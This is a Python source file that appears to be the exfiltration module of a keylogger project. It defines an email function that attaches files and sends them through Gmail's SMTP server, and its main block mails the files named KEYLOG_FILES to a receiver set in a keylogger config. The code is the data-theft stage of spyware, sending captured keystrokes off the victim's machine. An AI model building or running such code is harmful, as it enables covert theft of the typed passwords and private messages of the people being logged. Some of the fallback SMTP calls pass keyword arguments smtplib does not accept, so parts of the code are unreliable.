import smtplib
from getpass import getpass
from email.mime.text import MIMEText
import sys
import os

os.chdir('../')
sys.path.append(os.getcwd())

from configs.keylog_cfg import *

import smtplib
from pathlib import Path
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email.mime.text import MIMEText
from email.utils import COMMASPACE, formatdate
from email import encoders

def send_email(sender,
               receiver,
               subject='',
               body='',
               files=[],
               server="smtp.gmail.com",
               username='',
               password='',
               port=587,
               use_tls=True):

    """Compose and send email with provided info and attachments.

    Args:
        sender (str): from name
        receiver (list[str]): to name(s)
        subject (str): body title
        body (str): message body
        files (list[str]): list of file paths to be attached to email
        server (str): mail server host name
        username (str): server auth username
        password (str): server auth password
        port (int): port number
        use_tls (bool): use TLS mode --- if True and fails, then try to send the email without TLS mode
    """

    msg = MIMEMultipart()
    msg['From'] = sender
    msg['To'] = receiver # COMMASPACE.join(receiver)
    msg['Date'] = formatdate(localtime=True)
    msg['Subject'] = subject

    msg.attach(MIMEText(body))

    for path in files:
        part = MIMEBase('application', "octet-stream")
        with open(path, 'rb') as file:
            part.set_payload(file.read())
        encoders.encode_base64(part)
        part.add_header('Content-Disposition',
                        'attachment; filename={}'.format(Path(path).name))
        msg.attach(part)

    try:
        smtp = smtplib.SMTP_SSL(server, port)
    except:
        try:
            smtp = smtplib.SMTP_SSL(server='smtp.gmail.com', port=465)
        except:
            smtp = smtplib.SMTP(server='smtp.gmail.com', port=587)

    try:
        if use_tls: smtp.starttls()
    except:
        pass

    smtp.login(username, password)
    smtp.sendmail(sender, receiver, msg.as_string())
    smtp.quit()

    return


if __name__ == '__main__':

    send_email(sender=EMAIL_LOGIN_INFO['LOGIN']['SENDER'],\
               receiver=EMAIL_LOGIN_INFO['LOGIN']['RECEIVER'],\
               subject=EMAIL_LOGIN_INFO['LOGIN']['SUBJECT'],\
               body=EMAIL_LOGIN_INFO['LOGIN']['BODY'],\
               username=EMAIL_LOGIN_INFO['LOGIN']['USERNAME'],\
               password=EMAIL_LOGIN_INFO['LOGIN']['PASSWORD'],\
               server='smtp.gmail.com',\
               files=[KEYLOG_FILES],\
               port=465)
